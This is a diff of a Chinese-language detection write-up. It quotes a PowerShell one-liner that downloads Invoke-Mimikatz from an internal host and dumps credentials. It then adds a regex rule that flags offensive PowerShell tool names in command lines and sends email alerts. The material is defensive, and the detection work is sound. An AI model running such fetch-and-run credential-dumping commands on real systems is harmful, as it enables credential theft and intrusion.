@@ -328,8 +328,39 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString(\"http://172.16.
 powershell IEX (New-Object System.Net.Webclient).DownloadString(\"http://172.16.251.133/Exfiltration/Invoke-Mimikatz.ps1\");Invoke-Mimikatz   -DumpCreds 
 
 ```
+可以在kibana 看到如下内容
 
 ![sysmon](../images/WechatIMG86.jpeg)
 
 ![sysmon](../images/WechatIMG87.jpeg)
 
+
+我们在用Go自研的规则引擎里面添加如下规则（也可以用flink做）
+
+```bash
+
+state:     enable
+rule_id :  Hacker-Command-Line-01
+rule_tag:  Hacker-Command-Line-events
+rule_name: Hacker-Command-Line
+rule_type: or  
+
+detect_list:
+
+  - field : command_line
+    type: re
+    rule: (Get-GPPAutologon|Get-TimedScreenshot|Invoke-DllInjection|Invoke-Shellcode|Invoke-WmiCommand|Get-System|Invoke-Mimikatz|Invoke-NinjaCopy|Out-Minidump)
+    ignorecase: True
+
+threat_level : high
+auth : njcx
+info": "Hacking Command Line events"
+
+e-mail:
+    - njcx@qq.com
+    - njcx91@qq.com
+
+
+```
+
+规则引擎命中后，即会写es，同时给邮箱发送告警，方便许多。
